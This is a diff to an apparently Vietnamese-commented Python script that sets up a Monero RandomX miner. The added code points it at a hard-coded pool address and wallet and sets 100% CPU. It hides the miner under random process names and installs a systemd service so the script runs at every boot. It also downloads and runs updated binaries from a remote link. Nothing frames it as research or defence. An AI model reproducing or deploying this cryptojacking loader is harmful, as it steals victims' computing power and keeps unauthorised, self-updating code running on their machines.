@@ -23,13 +23,13 @@ if operate_system == 'lin':
         os.system('apt-get update -y')
         #os.system ('apt --fix-broken install -y')
         os.system('apt-get install -y screen')
-        os.system('apt-get install -y python-pip')
+        #os.system('apt-get install -y python-pip')
         os.system('apt-get install -y python3-pip')
     except:
         pass
     try:
         os.system('apt-get install -y python3-setuptools')
-        os.system('python3 -m easy_install install pip')
+        os.system('python3 -m easy_install pip')
         os.system('apt-get install -y python3-psutil')
     except:
         pass
@@ -72,6 +72,16 @@ app_name = 'nql'
 print(f'app_name = {app_name}\n')
 version_chinh = 5.9
 print(f'version_chinh = {version_chinh}\n')
+
+cpu_max = 100
+proxy_server = '15.235.202.114:443'
+
+thoi_gian_chay = 3600
+thoi_gian_nghi = 300
+
+command_default = f'--algo randomx -o {proxy_server} --tls --cpu-max-threads-hint={cpu_max} --http-host=0.0.0.0 --http-port=80'
+#command_default = '--algo randomx -o 15.235.202.114:443 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
+#command_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
 
 
 while True:
@@ -156,6 +166,7 @@ while True:
 
     source_file = os.path.join(working_dir, folder_app_name, app_name)
     random_app_name = ''.join(random.choice(string.ascii_letters) for _ in range(10))
+    print(f'random_app_name = {random_app_name}\n')
     destination_file = os.path.join(working_dir, folder_app_name, random_app_name)
     shutil.copy(source_file, destination_file)
       
@@ -190,7 +201,111 @@ while True:
                     fileopen = open(path_script, 'w+')
                     fileopen.write(data_trave)
                     fileopen.close()
-                    os.execv(sys.executable, [sys.executable, path_script])
+                    if operate_system == 'linux':
+                        os.system(f'python3 {path_script}')
+                    if operate_system == 'win':
+                        os.system(f'python {path_script}')
+                    
+                    sys.exit()
     except:
         pass
-    time.sleep(10000)
+    #update app name
+    try:
+        command = f'{os.path.join(working_dir, folder_app_name, app_name)} --version'
+        output = subprocess.check_output(command, shell=True).decode('utf-8')
+        #print(output)
+        #time.sleep(10000)
+        version_tam = output.split(' ')
+        version_app_name = version_tam[1].strip()
+        print(f'Version {app_name} la {version_app_name}\n')
+        
+        for i in range(0, 3, 1):
+            try:
+                response = requests.get(link_version_app, headers = headers, timeout=60)
+                if response.status_code == 200:
+                    get_version_app_name = response.text.strip()
+                    break
+            except:
+                continue
+        print(f'Version {app_name} lay tren web la {get_version_app_name}\n')
+        #Check version uam
+        if get_version_app_name == version_app_name and len(get_version_app_name) < 20:
+            print(f'{app_name} dang o phien ban moi nhat {version_app_name}\n')
+        if get_version_app_name != version_app_name and len(get_version_app_name) < 20:
+            files = [f for f in os.listdir(os.path.join(working_dir, folder_app_name)) if os.path.isfile(os.path.join(working_dir, folder_app_name, f))]
+            print(f"Files in {os.path.join(working_dir, folder_app_name)}: {files}")
+            for name in files:
+                for proc in psutil.process_iter(['pid', 'name']):
+                    try:
+                        if name in proc.info['name']:
+                            print(f"Killing process {proc.info['name']} with PID {proc.info['pid']}")
+                            proc.terminate()
+                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                        pass
+            print(f'{app_name} da co phien ban moi, tien hanh update thoi\n')
+            try:
+                os.remove(os.path.join(working_dir, folder_app_name_gz))
+            except:
+                pass
+            try:
+                shutil.rmtree(os.path.join(working_dir, folder_app_name))
+            except:
+                pass
+            wget.download(link_download_app, os.path.join(working_dir, folder_app_name_gz))
+            try:
+                with tarfile.open(os.path.join(working_dir, folder_app_name_gz)) as tar:  # Auto-detects the compression type
+                    tar.extractall(path=working_dir)
+                print(f"\nExtracted all files to {working_dir}\n")
+            except:
+                pass
+            os.chmod(os.path.join(working_dir, folder_app_name, app_name), 0o777)
+            source_file = os.path.join(working_dir, folder_app_name, app_name)
+            random_app_name = ''.join(random.choice(string.ascii_letters) for _ in range(10))
+            print(f'random_app_name = {random_app_name}\n')
+            destination_file = os.path.join(working_dir, folder_app_name, random_app_name)
+            shutil.copy(source_file, destination_file)
+            
+    except:
+        pass
+
+    if operate_system == 'lin':
+        try:
+            path_service = '/lib/systemd/system/dao.service'
+            data = f'[Unit]\nDescription=dao service\n[Service]\nType=simple\nExecStart=/usr/bin/python3 {path_script}\n[Install]\nWantedBy=multi-user.target'
+            if not os.path.exists(path_service):
+                fileopen = open(path_service, 'w+')
+                fileopen.write(data + '\n')
+                fileopen.close()
+            #os.system('chmod 600 %s' %path)
+                os.system('systemctl daemon-reload')
+                os.system('systemctl enable dao')
+        except:
+            pass
+
+    try:
+        command = f'{os.path.join(working_dir, folder_app_name, random_app_name)} {command_default}'
+        print(command)
+        if os.path.isfile('/usr/bin/screen'):
+            print('Co chuong trinh screen\n')
+            os.system ('screen -dmS %s %s' %(app_name, command))
+        elif os.path.isfile('/usr/bin/nohup'):
+            print('Co chuong trinh nohup\n')
+            os.system ('nohup %s &' %command)
+        else:
+            os.system ('%s &' %command)
+    except:
+        pass
+
+    time.sleep(thoi_gian_chay)
+
+    files = [f for f in os.listdir(os.path.join(working_dir, folder_app_name)) if os.path.isfile(os.path.join(working_dir, folder_app_name, f))]
+    print(f"Files in {os.path.join(working_dir, folder_app_name)}: {files}")
+    for name in files:
+        for proc in psutil.process_iter(['pid', 'name']):
+            try:
+                if name in proc.info['name']:
+                    print(f"Killing process {proc.info['name']} with PID {proc.info['pid']}")
+                    proc.terminate()
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                pass
+    time.sleep(thoi_gian_nghi)
